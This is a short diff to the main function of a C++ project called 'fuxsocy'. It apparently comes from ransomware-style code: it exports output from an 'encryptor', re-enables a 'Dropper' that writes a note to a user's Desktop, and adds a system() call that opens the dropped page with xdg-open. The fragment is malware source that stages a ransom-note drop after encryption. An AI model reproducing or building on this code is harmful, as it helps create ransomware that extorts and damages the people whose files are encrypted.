@@ -18,9 +18,9 @@ int main(int argc, char* args[]) {
   }
   cout << encryptor.Export() << endl;
 
-  //system("xdg-open ~/Code/fuxsocy/DailyAllowance/pages/index.html");
-  //Dropper dropper("/home/aesophor/Desktop/");
-  //dropper.DropNote();
+  Dropper dropper("/home/aesophor/Desktop");
+  dropper.DropNote();
 
+  system("xdg-open /home/aesophor/Desktop/index.html");
   return EXIT_SUCCESS;
 }
